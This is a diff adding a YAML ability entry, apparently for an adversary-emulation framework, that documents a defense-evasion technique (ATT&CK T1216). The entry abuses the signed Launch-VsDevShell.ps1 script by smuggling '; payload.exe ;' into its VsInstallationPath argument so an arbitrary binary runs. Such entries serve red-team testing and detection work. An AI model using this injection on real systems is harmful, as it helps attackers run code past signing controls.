@@ -1,0 +1,26 @@
+- id: e3522428-c5e1-a9cf-8275-5518694c3bd6
+  name: Launch-VsDevShell.ps1 - Execute binaries and commands from the context of
+    the signed script using the "VsInstallationPath" flag.
+  description: Execute binaries and commands from the context of the signed script
+    using the "VsInstallationPath" flag.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1216
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      psh:
+        command: powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath
+          "/../../../../../; payload.exe ;"
+        payloads:
+        - payload.exe
+  singleton: true
+  privilege: User
+  repeatable: false
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Nasreddine Bencherchali
+  created: '2022-06-13'
+  modified: '2022-06-13'
+  operating_system: Windows All Versions
